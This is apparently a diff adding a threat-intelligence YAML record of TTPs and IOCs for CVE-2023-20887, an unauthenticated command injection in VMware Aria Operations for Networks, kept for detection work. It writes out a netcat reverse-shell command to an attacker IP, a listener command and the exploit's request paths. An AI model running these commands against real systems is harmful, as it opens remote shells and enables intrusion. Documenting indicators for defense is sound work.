@@ -1,0 +1,86 @@
+description: A command injection vulnerability in VMware Aria Operations for Networks
+  versions 6.2 through 6.10 allows unauthenticated users to achieve remote code execution
+  with root privileges.
+TTPs:
+  processes:
+  - java
+  - nc
+  commandline:
+  - 'java -XX:+UseParallelGC -XX:NativeMemoryTracking=summary -Xss256K -Dorg.xerial.snappy.tempdir=/home/ubuntu/tmp
+    -Dlog4j2.debug=DEBUG -Digdir=/var/logsarkin/saasservice -Dlog4j.configurationFile=/home/ubuntu/build-target/saasservice/saasservice.log4j2.xml
+    -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.password.file=/home/ubuntu/build-target/saasservice/jmxremote.password
+    -Dcom.sun.management.jmxremote.access.file=/home/ubuntu/build-target/saasservice/jmxremote.access
+    -Djava.rmi.server.hostname=192.168.1.102 -Dcom.sun.management.jmxremote.ssl=false
+    -Dcom.sun.management.jmxremote.port=1100 -Dcom.sun.management.jmxremote.password.toHashes=false
+    -Xmx50M -XX:MaxDirectMemorySize=512m -XX:MaxMetaspaceSize=512m -Ddeployment.info=1EH1AEYUFKO4DX9L14QBP02659
+    -Ddeployment.id=DRUNFZM -Dsk.info=platform -DuifccessUrlPath=/home/ubuntu/build-target/deployment/ui-access-url.info
+    -Dreporter.configuration=/home/ubuntu/build-target/saasservice/reporters.configuration
+    -Dreporters.application.name=uRNI -Ddatadog.host=vrni-platform-release.192.168.1.102
+    -Ddatadog.tags=env:URNI-NEW-DEV,role:PLATFORM,did:DRUNFZM,iid:IEH1AEYUFKO4DX9L14QBP02659,type:onprem,sku:platform,setup:vrni-platform-release,inf:urni
+    -Durni.metrics.tags=env:URNI-NEW-DEV,role:PLATFORM,did:DRUNFZM,iid:IEH1AEYUFKO4DX9L14QBP02659,type:onprem,sku:platform,setup:vrni-platform-release,inf:urni
+    -Durni.metrics.host=vrni-platform-release.192.168.1.102 -Dpostgres.configuration=/home/ubuntu/build-target/saasservice/postgres.configuration
+    -Ddynamodb.configuration=/home/ubuntu/build-target/saasservice/dynamodb.configuration
+    -Delasticsearch.configuration=/home/ubuntu/build-target/saasservices/elasticsearch.configuration
+    -Ddpconfig.base.folder=/home/ubuntu/build-target/saasservice -Ddp.operational.config.base.folder=/home/ubuntu/build-target/saasservice
+    -Dtaskmgr.spec.folder=/home/ubuntu/build-target/saasservice -DOvaParanFile=Ect:/unerasova.parans
+    -Dcustomer.configuration=/home/ubuntu/build-target/saasservice/customer.configuration
+    -Dpolicy.config.path=/home/ubuntu/build-target/saasservice/policy -Ddeployment.type=onprem
+    -X:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/heap-dumps/saasservice
+    -XX:+ExitOnOutOfMemoryError --add-opens java.base/java.lang=ALL-UNNAMED --add-opens
+    java.base/java.nio=ALL-UNNAMED --add-exports java.base/jdk.internal.misc=ALL-UNNAMED
+    --add-modules jdk.unsupported -Dio.netty.tryReflectionSetAccessible=true --illegal-access=warn
+    -Ddeployment_type.path=/home/ubuntu/build-target/deployment/deployment.type -Dplatform_shared_keypair_pub=/home/ubuntu/build-target/deployment/keys/shared.crt
+    -Dplatform_shared_keypair_put=/home/ubuntu/build-target/deployment/keys/shared.pem
+    -Djava.security.properties: "/home/ubuntu/build-target/saasservice/java.security"'
+  - nc -lnvp 3333
+  - ncat 192.168.1.49 3333 -e /bin/sh
+  powershell:
+  - ''
+  scripting_engine:
+  - ''
+  registry_keys:
+  - ''
+  image_load:
+  - ''
+  network_connections:
+  - POST /saasresttosaasservlet HTTP/2.0
+  - POST /saas./resttosaasservlet HTTP/2.0
+  - 192.168.1.102:45742 -> 192.168.1.102:9090 [SYN] Seq=0 Win=65495 [TCP CHL]
+  - 192.168.1.102:9090 -> 192.168.1.102:45742 [SYN, ACK] Seq=0 Ack=1 Win=65
+  - 192.168.1.102:45742 -> 192.168.1.102:9090 [ACK] Seq=1 Ack=1 Win=65536
+  - 192.168.1.102:45742 -> 192.168.1.102:9090 HTTP POST /resttosaasservlet HTTP/1.1
+    (application/x-thrift)
+  - 192.168.1.102:35986 -> 192.168.1.49:3333
+  - executable: nc
+    destination_address: 0.0.0.0
+    port: '3333'
+  - executable: ncat
+    destination_address: 192.168.1.49
+    port: '3333'
+  file_activity:
+  - /tmp/hacked.txt
+  persistence:
+  - ''
+  pipes:
+  - ''
+  process_relations:
+  - java (PID 8480) listening on port 9090 for incoming connections
+IOCs:
+  hashes: []
+  IPs:
+  - 192.168.1.102
+  - 192.168.1.49
+  - 0.0.0.0
+  domains: []
+  URLs:
+  - /saasresttosaasservlet
+  - /saas./resttosaasservlet
+authors:
+- Ashish Joshi
+attribution:
+- Unknown
+malware_families:
+- ''
+reference: https://blogs.juniper.net/en-us/threat-research/cve-2023-20887-vmware-aria-operations-for-networks-unauthenticated-remote-code-execution
+date_of_publication: September 20, 2023
+file_creation_date: August 03, 2025
